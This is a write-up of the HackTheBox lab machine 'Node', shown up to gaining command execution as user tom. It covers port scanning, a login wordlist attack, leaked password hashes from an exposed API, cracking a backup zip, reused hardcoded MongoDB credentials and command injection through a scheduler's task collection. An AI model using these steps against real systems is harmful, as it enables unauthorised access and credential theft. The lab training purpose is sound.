# Node | HackTheBox

### 1. Scan
```
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.71.65
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-29 02:16 UTC
Nmap scan report for 10.129.71.65
Host is up (0.22s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   221.35 ms 10.10.14.1
2   222.80 ms 10.129.71.65

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.25 seconds
```
The machine is running SSH and Apache Hardoop on port 3000.

### 2. Enumeration
Going to the HTTP site on the Hardoop port shows a budding social media website called "MyPlace". The front page shows there are three new members: tom, mark and rastating.  
Running a dirbust against the site can be done by specifying a bad string in the response since every request returns 200, but nothing of any real interest is discovered.  
There is a login page - I create a script to conduct a wordlist attack on the login form since there is no protection against bruteforce (see loginattack.py).
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~/writeups/HackTheBox/HTB_Node]
└──╼ [★]$ ./loginattack.py 
[+] Attempting wordlist attack for tom...
Attempts for tom: 0
[+] Login - tom:spongebob
[+] Attempting wordlist attack for mark...
Attempts for mark: 0
Attempts for mark: 100
Attempts for mark: 200
Attempts for mark: 300
Attempts for mark: 400
Attempts for mark: 500
Attempts for mark: 600
Attempts for mark: 700
Attempts for mark: 800
Attempts for mark: 900
Attempts for mark: 1000
Attempts for mark: 1100
Attempts for mark: 1200
Attempts for mark: 1300
Attempts for mark: 1400
[+] Login - mark:snowflake
[+] Attempting wordlist attack for rastating...
Attempts for rastating: 0
Attempts for rastating: 100
Attempts for rastating: 200
Attempts for rastating: 300
Attempts for rastating: 400
Attempts for rastating: 500
...
```
Two sets of credentials are recovered: `tom:spongebob` and `mark:snowflake`.  
Logging in as these users gives only a single page indicating there is no functionality for non-admin users. From here it can be concluded that these users are a dead end.
  
Taking a look at the site in Burpsuite, the pages are retrieving information from several endpoints. One is used to the the list of latest users: `/api/users/latest`.  
By changing this to `/api/users` the response returns a list of users and their password hashes.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~/writeups/HackTheBox/HTB_Node]
└──╼ [★]$ curl --silent http://10.129.71.65:3000/api/users | jq
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```
Searching online for the admin's hash completes a set of valid admin credentials: `myP14ceAdm1nAcc0uNT:manchester`.

### 3. Log in to the admin page
The admin's dashboard has a single link to download a backup.
```bash
divip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ file myplace.backup 
myplace.backup: ASCII text, with very long lines, with no line terminators
```
The file's contents is base64 encoded.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ cat myplace.backup | base64 -d > backup.zip
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ file backup.zip 
backup.zip: Zip archive data, at least v1.0 to extract
```
The zipfile has a password, but it does appear in a wordlist so it can be recovered.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ fcrackzip --dictionary -p rockyou.txt -u backup.zip 


PASSWORD FOUND!!!!: pw == magicword
```
The backup file can now be unzipped, which recovers the source code to the entire application.

### 4. Check out the source code
Install and run the code auditing in retire.js:
```bash─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-afhzlzxoeo]─[~/var/www/myplace]
└──╼ [★]$ sudo npm install -g retire

added 43 packages, and audited 43 packages in 2s

3 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities
npm notice 
npm notice New minor version of npm available! 7.1.0 -> 7.3.0
npm notice Changelog: https://github.com/npm/cli/releases/tag/v7.3.0
npm notice Run npm install -g npm@7.3.0 to update!
npm notice
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-afhzlzxoeo]─[~/var/www/myplace]
└──╼ [★]$ retire --colors
retire.js v2.2.4
Loading from cache: https://raw.githubusercontent.com/RetireJS/retire.js/master/repository/jsrepository.json
Loading from cache: https://raw.githubusercontent.com/RetireJS/retire.js/master/repository/npmrepository.json
/home/htb-jib1337/var/www/myplace/static/vendor/angular/angular-route.min.js
 ↳ angularjs 1.6.5
angularjs 1.6.5 has known vulnerabilities: severity: medium; summary: XSS may be triggered in AngularJS applications that sanitize user-controlled HTML snippets before passing them to JQLite methods like JQLite.prepend, JQLite.after, JQLite.append, JQLite.replaceWith, JQLite.append, new JQLite and angular.element., CVE: CVE-2020-7676; https://github.com/advisories/GHSA-5cp4-xmrw-59wf severity: medium; summary: angular.js prior to 1.8.0 allows cross site scripting. The regex-based input HTML replacement may turn sanitized code into unsanitized one., CVE: CVE-2020-7676; https://nvd.nist.gov/vuln/detail/CVE-2020-7676 severity: medium; summary: Prototype pollution; https://github.com/angular/angular.js/commit/726f49dcf6c23106ddaf5cfd5e2e592841db743a https://github.com/angular/angular.js/blob/master/CHANGELOG.md#179-pollution-eradication-2019-11-19 severity: low; summary: XSS through SVG if enableSvg is set; https://github.com/angular/angular.js/blob/master/CHANGELOG.md#169-fiery-basilisk-2018-02-02 https://vulnerabledoma.in/ngSanitize1.6.8_bypass.html
/home/htb-jib1337/var/www/myplace/static/vendor/angular/angular.min.js
 ↳ angularjs 1.6.5
angularjs 1.6.5 has known vulnerabilities: severity: medium; summary: XSS may be triggered in AngularJS applications that sanitize user-controlled HTML snippets before passing them to JQLite methods like JQLite.prepend, JQLite.after, JQLite.append, JQLite.replaceWith, JQLite.append, new JQLite and angular.element., CVE: CVE-2020-7676; https://github.com/advisories/GHSA-5cp4-xmrw-59wf severity: medium; summary: angular.js prior to 1.8.0 allows cross site scripting. The regex-based input HTML replacement may turn sanitized code into unsanitized one., CVE: CVE-2020-7676; https://nvd.nist.gov/vuln/detail/CVE-2020-7676 severity: medium; summary: Prototype pollution; https://github.com/angular/angular.js/commit/726f49dcf6c23106ddaf5cfd5e2e592841db743a https://github.com/angular/angular.js/blob/master/CHANGELOG.md#179-pollution-eradication-2019-11-19 severity: low; summary: XSS through SVG if enableSvg is set; https://github.com/angular/angular.js/blob/master/CHANGELOG.md#169-fiery-basilisk-2018-02-02 https://vulnerabledoma.in/ngSanitize1.6.8_bypass.html
/home/htb-jib1337/var/www/myplace/static/vendor/jquery/jquery.js
 ↳ jquery 1.12.4
jquery 1.12.4 has known vulnerabilities: severity: medium; issue: 2432, summary: 3rd party CORS request may execute, CVE: CVE-2015-9251; https://github.com/jquery/jquery/issues/2432 http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/ https://nvd.nist.gov/vuln/detail/CVE-2015-9251 http://research.insecurelabs.org/jquery/test/ severity: medium; CVE: CVE-2015-9251, issue: 11974, summary: parseHTML() executes scripts in event handlers; https://bugs.jquery.com/ticket/11974 https://nvd.nist.gov/vuln/detail/CVE-2015-9251 http://research.insecurelabs.org/jquery/test/ severity: low; CVE: CVE-2019-11358, summary: jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution; https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/ https://nvd.nist.gov/vuln/detail/CVE-2019-11358 https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b severity: medium; CVE: CVE-2020-11022, summary: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS; https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ severity: medium; CVE: CVE-2020-11023, summary: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS; https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/
/home/htb-jib1337/var/www/myplace/static/vendor/jquery/jquery.min.js
 ↳ jquery 1.12.4
jquery 1.12.4 has known vulnerabilities: severity: medium; issue: 2432, summary: 3rd party CORS request may execute, CVE: CVE-2015-9251; https://github.com/jquery/jquery/issues/2432 http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/ https://nvd.nist.gov/vuln/detail/CVE-2015-9251 http://research.insecurelabs.org/jquery/test/ severity: medium; CVE: CVE-2015-9251, issue: 11974, summary: parseHTML() executes scripts in event handlers; https://bugs.jquery.com/ticket/11974 https://nvd.nist.gov/vuln/detail/CVE-2015-9251 http://research.insecurelabs.org/jquery/test/ severity: low; CVE: CVE-2019-11358, summary: jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution; https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/ https://nvd.nist.gov/vuln/detail/CVE-2019-11358 https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b severity: medium; CVE: CVE-2020-11022, summary: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS; https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ severity: medium; CVE: CVE-2020-11023, summary: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS; https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/
/home/htb-jib1337/var/www/myplace/static/vendor/bootstrap/js/bootstrap.js
 ↳ bootstrap 3.3.7
bootstrap 3.3.7 has known vulnerabilities: severity: high; issue: 28236, summary: XSS in data-template, data-content and data-title properties of tooltip/popover, CVE: CVE-2019-8331; https://github.com/twbs/bootstrap/issues/28236 severity: medium; issue: 20184, summary: XSS in data-target property of scrollspy, CVE: CVE-2018-14041; https://github.com/twbs/bootstrap/issues/20184 severity: medium; issue: 20184, summary: XSS in collapse data-parent attribute, CVE: CVE-2018-14040; https://github.com/twbs/bootstrap/issues/20184 severity: medium; issue: 20184, summary: XSS in data-container property of tooltip, CVE: CVE-2018-14042; https://github.com/twbs/bootstrap/issues/20184
/home/htb-jib1337/var/www/myplace/static/vendor/bootstrap/js/bootstrap.min.js
 ↳ bootstrap 3.3.7
bootstrap 3.3.7 has known vulnerabilities: severity: high; issue: 28236, summary: XSS in data-template, data-content and data-title properties of tooltip/popover, CVE: CVE-2019-8331; https://github.com/twbs/bootstrap/issues/28236 severity: medium; issue: 20184, summary: XSS in data-target property of scrollspy, CVE: CVE-2018-14041; https://github.com/twbs/bootstrap/issues/20184 severity: medium; issue: 20184, summary: XSS in collapse data-parent attribute, CVE: CVE-2018-14040; https://github.com/twbs/bootstrap/issues/20184 severity: medium; issue: 20184, summary: XSS in data-container property of tooltip, CVE: CVE-2018-14042; https://github.com/twbs/bootstrap/issues/20184
```
None of these vulnerabilities are of interest.  
Manually checking the source code reveals some credentials which have been hardcoded:
```js
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-t9ycdo1if1]─[~/node/var/www/myplace]
└──╼ [★]$ cat app.js | head -n 20

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```
These credentials are `mark:5AYRft73VtFpc84k`.

### 5. Get a shell on the machine
These new creds can be used to access SSH.
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-t9ycdo1if1]─[~/node/var/www/myplace]
└──╼ [★]$ ssh mark@10.129.81.230
The authenticity of host '10.129.81.230 (10.129.81.230)' can't be established.
ECDSA key fingerprint is SHA256:I0Y7EMtrkyc9Z/92jdhXQen2Y8Lar/oqcDNLHn28Hbs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.81.230' (ECDSA) to the list of known hosts.
mark@10.129.81.230's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.



              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ whoami
mark
```

### 6. Enumeration
- The user has no sudo perms  
There are three users on the machine:
```bash
mark@node:/home$ ls
frank  mark  tom
```
In the running processes, there is a mongo database running and two node applications.
```bash
mark@node:/home$ ps aux | grep mongo
mongodb   1425  0.4 12.4 286080 94336 ?        Ssl  11:31   0:06 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
mark      1804  0.0  0.1  14228   932 pts/0    S+   11:54   0:00 grep --color=auto mongo
mark@node:/home$ ps aux | grep node
tom       1426  0.0  6.7 1028148 51392 ?       Ssl  11:31   0:01 /usr/bin/node /var/www/myplace/app.js
tom       1431  0.0  5.1 1008056 38992 ?       Ssl  11:31   0:00 /usr/bin/node /var/scheduler/app.js
```
Looking at the scheduler, it is a small application that executes commands from it's mongodb database.
```bash
mark@node:/var/scheduler$ cat app.js 
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```
It happens to be reusing the same credentials as the myplace database, so we should be able to access both of them and check them out.

### 7. Look at the databases
The first database, "myplace", just has the previously-discovered credentials and nothing else.
```bash
mark@node:/home$ mongo -u mark -p 5AYRft73VtFpc84k myplace
MongoDB shell version: 3.2.16
connecting to: myplace
> db
myplace
> db.collection.count()
0
> db.getCollectionNames()
[ "users" ]
> db.users.find( {} )
{ "_id" : ObjectId("59a7365b98aa325cc03ee51c"), "username" : "myP14ceAdm1nAcc0uNT", "password" : "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af", "is_admin" : true }
{ "_id" : ObjectId("59a7368398aa325cc03ee51d"), "username" : "tom", "password" : "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240", "is_admin" : false }
{ "_id" : ObjectId("59a7368e98aa325cc03ee51e"), "username" : "mark", "password" : "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73", "is_admin" : false }
{ "_id" : ObjectId("59aa9781cced6f1d1490fce9"), "username" : "rastating", "password" : "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0", "is_admin" : false }
```
The scheduler database has one collection called "tasks", which is empty.
```bash
mark@node:/home$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> db
scheduler
> db.collection.count()
0
> db.getCollectionNames()
[ "tasks" ]
> db.tasks.find( {} )
> 
```
I can attempt to add a command and see if it executes. First I try a bash reverse shell which fails, but I try something simpler - adding a file to /tmp which works.
```bash
> db.tasks.insert({"cmd":"echo test > /tmp/test.txt"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find( {} )
{ "_id" : ObjectId("5ffee4ea0cb0aeb47b0cbf59"), "cmd" : "echo test > /tmp/test.txt" }
> exit
bye
mark@node:/var/scheduler$ ls /tmp/test.txt 
/tmp/test.txt
mark@node:/var/scheduler$ ls -l /tmp/test.txt 
-rw-r--r-- 1 tom tom 5 Jan 13 12:17 /tmp/test.txt
```
This confirms I have some degree of command execution as the tom user, now to figure out how to use it.


